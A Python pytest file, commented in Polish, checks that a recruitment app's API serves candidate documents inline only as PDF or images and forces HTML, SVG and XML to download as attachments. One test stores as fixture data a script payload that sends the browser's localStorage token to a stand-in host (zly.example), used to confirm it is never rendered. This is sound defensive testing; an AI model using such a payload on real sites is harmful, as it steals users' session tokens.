"""`?disposition=inline` renderuje w karcie wyłącznie PDF i obrazy rastrowe.

`content_type` dokumentu kandydata nie zawsze pochodzi z naszego uploadu
(ten normalizuje go po rozszerzeniu) — wiersze z importu Traffita, poczty M365
i starszych ścieżek niosą to, co przysłał nadawca. `text/html` albo
`image/svg+xml` otwarte inline wykonywałyby skrypt na originie API, a tam leży
token rekrutera. Każdy inny typ wychodzi jako `attachment`; `nosniff` dokłada
globalny middleware.
"""

from __future__ import annotations

import uuid

import pytest
from httpx import AsyncClient
from sqlalchemy import delete

from app.api.candidates import _safe_document_disposition


@pytest.mark.parametrize(
    "media_type",
    [
        "application/pdf",
        "image/png",
        "image/jpeg",
        "image/gif",
        "image/webp",
        "Application/PDF; charset=binary",
    ],
)
def test_renderable_types_stay_inline(media_type):
    assert _safe_document_disposition(media_type, "inline") == "inline"


@pytest.mark.parametrize(
    "media_type",
    [
        "text/html",
        "image/svg+xml",
        "application/xhtml+xml",
        "text/xml",
        "application/octet-stream",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "",
        None,
    ],
)
def test_everything_else_is_forced_to_attachment(media_type):
    assert _safe_document_disposition(media_type, "inline") == "attachment"


def test_attachment_request_stays_attachment():
    assert _safe_document_disposition("application/pdf", "attachment") == "attachment"


@pytest.mark.asyncio
async def test_html_document_is_never_served_inline(
    app_client: AsyncClient, app_auth_headers: dict[str, str]
):
    from app.core.database import AsyncSessionLocal
    from app.models.candidate import Candidate
    from app.models.candidate_document import CandidateDocument

    payload = b"<script>fetch('https://zly.example/?t='+localStorage.token)</script>"
    async with AsyncSessionLocal() as db:
        candidate = Candidate(name="Inline", lastname=f"Html-{uuid.uuid4().hex[:6]}")
        db.add(candidate)
        await db.flush()
        html_doc = CandidateDocument(
            candidate_id=candidate.id,
            filename="cv.html",
            file_content=payload,
            content_type="text/html",
            size_bytes=len(payload),
        )
        pdf_doc = CandidateDocument(
            candidate_id=candidate.id,
            filename="cv.pdf",
            file_content=b"%PDF-1.4\n%%EOF\n",
            content_type="application/pdf",
            size_bytes=15,
        )
        db.add_all([html_doc, pdf_doc])
        await db.commit()
        candidate_id, html_id, pdf_id = candidate.id, html_doc.id, pdf_doc.id
    try:
        html = await app_client.get(
            f"/api/candidates/{candidate_id}/documents/{html_id}/content",
            params={"disposition": "inline"},
            headers=app_auth_headers,
        )
        assert html.status_code == 200, html.text
        assert html.headers["content-disposition"].startswith("attachment")
        assert html.headers["x-content-type-options"] == "nosniff"
        # Bajty bez zmian — podgląd w UI dalej je dostaje.
        assert html.content == payload

        pdf = await app_client.get(
            f"/api/candidates/{candidate_id}/documents/{pdf_id}/content",
            params={"disposition": "inline"},
            headers=app_auth_headers,
        )
        assert pdf.status_code == 200, pdf.text
        assert pdf.headers["content-disposition"].startswith("inline")
    finally:
        async with AsyncSessionLocal() as db:
            await db.execute(
                delete(CandidateDocument).where(
                    CandidateDocument.candidate_id == candidate_id
                )
            )
            await db.execute(delete(Candidate).where(Candidate.id == candidate_id))
            await db.commit()
